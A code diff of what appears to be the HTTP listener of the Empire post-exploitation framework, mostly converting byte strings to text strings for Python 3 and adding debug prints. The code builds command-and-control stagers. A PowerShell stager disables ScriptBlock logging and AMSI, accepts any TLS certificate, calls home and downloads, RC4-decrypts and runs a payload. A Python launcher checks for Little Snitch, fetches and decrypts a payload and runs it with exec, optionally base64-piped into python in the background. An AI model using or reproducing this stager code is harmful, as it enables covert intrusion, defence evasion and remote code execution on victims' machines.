@@ -305,33 +305,33 @@ class Listener(object):
 
                     # ScriptBlock Logging bypass
                     stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[ref].Assembly.GetType(")
-                    stager += b"'System.Management.Automation.Utils'"
+                    stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += b"'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
                     stager += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$"+helpers.generate_random_script_var_name("GPC")+"=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPC")+"")
-                    stager += b"['ScriptB'+'lockLogging']"
+                    stager += "['ScriptB'+'lockLogging']"
                     stager += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPC")+"")
-                    stager += b"['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
                     stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
-                    stager += b"['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
                     stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    stager += b"('EnableScriptB'+'lockLogging',0);"
+                    stager += "('EnableScriptB'+'lockLogging',0);"
                     stager += helpers.randomize_capitalization("$val.Add")
-                    stager += b"('EnableScriptBlockInvocationLogging',0);"
+                    stager += "('EnableScriptBlockInvocationLogging',0);"
                     stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
-                    stager += b"['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
                     stager += helpers.randomize_capitalization("=$val}")
                     stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    stager += b"'signatures','N'+'onPublic,Static'"
+                    stager += "'signatures','N'+'onPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
-                    stager += b"'System.Management.Automation.AmsiUtils'"
+                    stager += "'System.Management.Automation.AmsiUtils'"
                     stager += helpers.randomize_capitalization(');$Ref.GetField(')
-                    stager += b"'amsiInitFailed','NonPublic,Static'"
+                    stager += "'amsiInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true);")
-                    stager += b"};"
+                    stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+"=New-Object System.Net.WebClient;")
@@ -339,15 +339,15 @@ class Listener(object):
                 if userAgent.lower() == 'default':
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
-                stager += b"$u='"+userAgent+"';"
+                stager += "$u='"+userAgent+"';"
 
                 if 'https' in host:
                     # allow for self-signed certificates for https connections
-                    stager += b"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 if userAgent.lower() != 'none':
                     stager += helpers.randomize_capitalization('$'+helpers.generate_random_script_var_name("wc")+'.Headers.Add(')
-                    stager += b"'User-Agent',$u);"
+                    stager += "'User-Agent',$u);"
 
                     if proxy.lower() != 'none':
                         if proxy.lower() == 'default':
@@ -359,7 +359,7 @@ class Listener(object):
                             stager += helpers.randomize_capitalization("');")
                             stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy = $proxy;")
                         if proxyCreds.lower() != 'none':
-                            if proxyCreds.lower() == b"default":
+                            if proxyCreds.lower() == "default":
                                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                             else:
                                 # TODO: implement form for other proxy credentials
@@ -368,14 +368,14 @@ class Listener(object):
                                 if len(username.split('\\')) > 1:
                                     usr = username.split('\\')[1]
                                     domain = username.split('\\')[0]
-                                    stager += b"$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                                 else:
                                     usr = username.split('\\')[0]
-                                    stager += b"$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
+                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
                                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = $netcred;")
 
                         #save the proxy settings to use during the entire staging process and the agent
-                        stager += b"$Script:Proxy = $"+helpers.generate_random_script_var_name("wc")+".Proxy;"
+                        stager += "$Script:Proxy = $"+helpers.generate_random_script_var_name("wc")+".Proxy;"
 
                 # TODO: reimplement stager retries?
                 #check if we're using IPv6
@@ -391,17 +391,25 @@ class Listener(object):
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
-                stager += b"'%s');" % (stagingKey)
+                stager += "'%s');" % (stagingKey)
 
                 # this is the minimized RC4 stager code from rc4.ps1
                 stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
 
-                # prebuild the request routing packet for the launcher
-                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                try:
+                    # prebuild the request routing packet for the launcher
+                    routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
+                    b64RoutingPacket = base64.b64encode(routingPacket)
 
-                stager += b"$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
-                cookieString = b"{}={};".format(cookie, b64RoutingPacket)
+                    stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
+                    cookieString = "{}={};".format(cookie, b64RoutingPacket)
+                except Exception as e:
+                    import sys
+                    import traceback
+                    print(helpers.color("Error adding routng packet: {}".format(e)))
+                    sys_t, sys_v, sys_tb = sys.exc_info()
+                    traceback.print_tb(sys_tb, file=sys.stdout)
+                    raise e
                 
                 #Add custom headers if any
                 if customHeaders != []:
@@ -410,19 +418,19 @@ class Listener(object):
                         headerValue = header.split(':')[1]
                         #If host header defined, assume domain fronting is in use and add a call to the base URL first
                         #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-                        if headerKey.lower() == b"host":
+                        if headerKey.lower() == "host":
                             stager += helpers.randomize_capitalization("try{$ig=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser)}catch{};")
 
-                        if headerKey.lower() == b"cookie":
-                            cookieString += b"{};".format(headerValue)
+                        if headerKey.lower() == "cookie":
+                            cookieString += "{};".format(headerValue)
                             continue
 
                         stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
-                        stager += b"\"%s\",\"%s\");" % (headerKey, headerValue)
+                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
 
                 # add the RC4 packet to a cookie
                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
-                stager += b"\"Cookie\",\"%s\");" % (cookieString)
+                stager += "\"Cookie\",\"%s\");" % (cookieString)
 
                 stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
@@ -442,19 +450,19 @@ class Listener(object):
             if language.startswith('py'):
                 # Python
 
-                launcherBase = b'import sys\n'
+                launcherBase = 'import sys\n'
                 if "https" in host:
                     # monkey patch ssl woohooo
-                    launcherBase += b"import ssl\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"
+                    launcherBase += "import ssl\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"
 
                 try:
                     if safeChecks.lower() == 'true':
-                        launcherBase += b"import re, subprocess\n"
-                        launcherBase += b"cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
-                        launcherBase += b"ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
-                        launcherBase += b"out, err = ps.communicate()\n"
-                        launcherBase += b"if re.search(\"Little Snitch\", out):\n"
-                        launcherBase += b"   sys.exit()\n"
+                        launcherBase += "import re, subprocess\n"
+                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
+                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
+                        launcherBase += "out, err = ps.communicate()\n"
+                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
+                        launcherBase += "   sys.exit()\n"
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stager: " + str(e)
                     print(helpers.color(p, color='red'))
@@ -463,18 +471,18 @@ class Listener(object):
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
 
-                launcherBase += b"import urllib2;\n"
-                launcherBase += b"UA='%s'\n" % (userAgent)
-                launcherBase += b"server='%s'\nt='%s'\n" % (host, stage0)
+                launcherBase += "import urllib2;\n"
+                launcherBase += "UA='%s'\n" % (userAgent)
+                launcherBase += "server='%s'\nt='%s'\n" % (host, stage0)
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                launcherBase += b"req=urllib2.Request(server+t)\n"
+                launcherBase += "req=urllib2.Request(server+t)\n"
                 # add the RC4 packet to a cookie
-                launcherBase += b"req.add_header('User-Agent',UA)\n"
-                cookieString = cookie + b'=' + b64RoutingPacket
+                launcherBase += "req.add_header('User-Agent',UA)\n"
+                cookieString = cookie + '=' + b64RoutingPacket.decode('utf-8')
                 
 
                 # Add custom headers if any
@@ -483,63 +491,63 @@ class Listener(object):
                         headerKey = header.split(':')[0]
                         headerValue = header.split(':')[1]
 
-                        if headerKey.lower() == b"cookie":
-                            cookieString += b"{}".format(headerValue)
+                        if headerKey.lower() == "cookie":
+                            cookieString += "{}".format(headerValue)
                             continue
 
                         #launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
-                        launcherBase += b"req.add_header(\"%s\",\"%s\")\n" % (headerKey, headerValue)
+                        launcherBase += "req.add_header(\"%s\",\"%s\")\n" % (headerKey, headerValue)
                 
-                launcherBase += b"req.add_header('Cookie',\"%s\")\n" % (cookieString)
+                launcherBase += "req.add_header('Cookie',\"%s\")\n" % (cookieString)
 
 
-                if proxy.lower() != b"none":
-                    if proxy.lower() == b"default":
-                        launcherBase += b"proxy = urllib2.ProxyHandler()\n"
+                if proxy.lower() != "none":
+                    if proxy.lower() == "default":
+                        launcherBase += "proxy = urllib2.ProxyHandler()\n"
                     else:
                         proto = proxy.split(':')[0]
-                        launcherBase += b"proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'})\n"
+                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'})\n"
 
-                    if proxyCreds != b"none":
-                        if proxyCreds == b"default":
-                            launcherBase += b"o = urllib2.build_opener(proxy)\n"
+                    if proxyCreds != "none":
+                        if proxyCreds == "default":
+                            launcherBase += "o = urllib2.build_opener(proxy)\n"
                         else:
-                            launcherBase += b"proxy_auth_handler = urllib2.ProxyBasicAuthHandler()\n"
+                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler()\n"
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
-                            launcherBase += b"proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"')\n"
-                            launcherBase += b"o = urllib2.build_opener(proxy, proxy_auth_handler)\n"
+                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"')\n"
+                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler)\n"
                     else:
-                        launcherBase += b"o = urllib2.build_opener(proxy)\n"
+                        launcherBase += "o = urllib2.build_opener(proxy)\n"
                 else:
-                    launcherBase += b"o = urllib2.build_opener()\n"
+                    launcherBase += "o = urllib2.build_opener()\n"
 
                 #install proxy and creds globally, so they can be used with urlopen.
-                launcherBase += b"urllib2.install_opener(o)\n"
+                launcherBase += "urllib2.install_opener(o)\n"
 
                 # download the stager and extract the IV
 
-                launcherBase += b"a=urllib2.urlopen(req).read()\n"
-                launcherBase += b"IV=a[0:4]\n"
-                launcherBase += b"data=a[4:]\n"
-                launcherBase += b"key=IV+'%s'\n" % (stagingKey)
+                launcherBase += "a=urllib2.urlopen(req).read()\n"
+                launcherBase += "IV=a[0:4]\n"
+                launcherBase += "data=a[4:]\n"
+                launcherBase += "key=IV+'%s'\n" % (stagingKey)
 
                 # RC4 decryption
-                launcherBase += b"S,j,out=range(256),0,[]\n"
-                launcherBase += b"for i in range(256):\n"
-                launcherBase += b"    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
-                launcherBase += b"    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += b"i=j=0\n"
-                launcherBase += b"for char in data:\n"
-                launcherBase += b"    i=(i+1)%256\n"
-                launcherBase += b"    j=(j+S[i])%256\n"
-                launcherBase += b"    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += b"    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
-                launcherBase += b"exec(''.join(out))"
+                launcherBase += "S,j,out=range(256),0,[]\n"
+                launcherBase += "for i in range(256):\n"
+                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
+                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
+                launcherBase += "i=j=0\n"
+                launcherBase += "for char in data:\n"
+                launcherBase += "    i=(i+1)%256\n"
+                launcherBase += "    j=(j+S[i])%256\n"
+                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
+                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
+                launcherBase += "exec(''.join(out))"
 
                 if encode:
                     launchEncoded = base64.b64encode(bytearray(launcherBase, 'utf8'))
-                    launcher = b"echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode(%s));\" | /usr/bin/python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode(%s));\" | /usr/bin/python &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -583,7 +591,7 @@ class Listener(object):
 
             # make sure the server ends with "/"
             if not host.endswith("/"):
-                host += b"/"
+                host += "/"
 
             #Patch in custom Headers
             remove = []
@@ -598,11 +606,11 @@ class Listener(object):
                 stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
 
             #patch in working hours, if any
-            if workingHours != b"":
+            if workingHours != "":
                 stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
 
             #Patch in the killdate, if any
-            if killDate != b"":
+            if killDate != "":
                 stager = stager.replace('REPLACE_KILLDATE', killDate)
 
             # patch the server and key information
@@ -629,8 +637,9 @@ class Listener(object):
             if encode:
                 return helpers.enc_powershell(randomizedStager)
             elif encrypt:
-                RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
+                import binascii
+                RC4IV = binascii.hexlify(os.urandom(2))
+                return RC4IV + encryption.rc4_enc(RC4IV+stagingKey, randomizedStager)
             else:
                 # otherwise just return the case-randomized stager
                 return randomizedStager
@@ -641,6 +650,7 @@ class Listener(object):
                 os.path.join(self.mainMenu.installPath, './data/agent/stagers')]
             eng = templating.TemplateEngine(template_path)
             template = eng.get_template('http.py')
+            print(helpers.color("[+] {}".format(self.mainMenu.installPath)))
 
             template_options = {
                     'working_hours': workingHours,
@@ -659,8 +669,11 @@ class Listener(object):
                 return base64.b64encode(stager)
             if encrypt:
                 # return an encrypted version of the stager ("normal" staging)
-                RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
+                import binascii
+                RC4IV = binascii.hexlify(os.urandom(2))
+                stagingKey = bytes(stagingKey, 'utf-8')
+                cT = encryption.rc4_enc(RC4IV+stagingKey[:28], stager)
+                return (RC4IV + cT)
             else:
                 # otherwise return the standard stager
                 return stager
@@ -708,7 +721,7 @@ class Listener(object):
             code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
 
             # patch in the killDate and workingHours if they're specified
-            if killDate != b"":
+            if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
             if obfuscate:
                 code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
@@ -716,6 +729,7 @@ class Listener(object):
 
         elif language == 'python':
             f = open(self.mainMenu.installPath + "./data/agent/agent.py")
+            print(helpers.color("[*] {}".format(self.mainMenu.installPath + "./data/agent/agent.py")))
             code = f.read()
             f.close()
 
@@ -753,7 +767,7 @@ class Listener(object):
 
         profile = listenerOptions['DefaultProfile']['Value']
         customHeaders = profile.split('|')[2:]
-        cookieString = b""
+        cookieString = ""
 
         if customHeaders != []:
             for header in customHeaders:
@@ -776,7 +790,7 @@ class Listener(object):
                 if listenerOptions['Host']['Value'].startswith('https'):
                     updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
-                getTask = b"""
+                getTask = """
                     $script:GetTask = {
 
                         try {
@@ -824,7 +838,7 @@ class Listener(object):
                     }
                 """
 
-                sendMessage = b"""
+                sendMessage = """
                     $script:SendMessage = {
                         param($Packets)
 
@@ -874,7 +888,7 @@ class Listener(object):
                 if listenerOptions['Host']['Value'].startswith('https'):
                     updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
 
-                sendMessage = b"""
+                sendMessage = """
 def send_message(packets=None):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
@@ -1183,6 +1197,8 @@ def send_message(packets=None):
             if dataResults and len(dataResults) > 0:
                 for (language, results) in dataResults:
                     if results:
+                        if isinstance(results, bytes):
+                            results = results.decode('iso-8859-1')
                         if results.startswith('STAGE2'):
                             # TODO: document the exact results structure returned
                             if ':' in clientIP:
@@ -1210,6 +1226,8 @@ def send_message(packets=None):
                             agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                             encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                             # TODO: wrap ^ in a routing packet?
+                            import binascii
+                            print("BEFORESEND: {}".format(binascii.hexlify(encryptedAgent)))
 
                             return make_response(encryptedAgent, 200)
 
